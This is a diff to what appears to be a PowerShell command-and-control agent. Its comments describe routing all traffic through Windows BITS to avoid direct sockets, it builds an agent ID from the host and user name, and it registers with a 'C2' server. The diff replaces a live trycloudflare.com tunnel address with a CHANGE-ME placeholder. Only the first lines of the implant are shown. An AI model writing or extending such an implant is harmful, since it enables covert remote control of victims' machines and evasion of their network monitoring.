@@ -2,7 +2,7 @@
 # Uses Windows Background Intelligent Transfer Service
 # No direct sockets - all via BITS (trusted by Windows)
 
- $ServerUrl = "https://attention-launches-kind-commonly.trycloudflare.com/bits"
+ $ServerUrl = "https://CHANGE-MECHANGE-ME.trycloudflare.com/bits"
 $AgentId = $env:COMPUTERNAME + "_" + $env:USERNAME
 
 # Register with C2
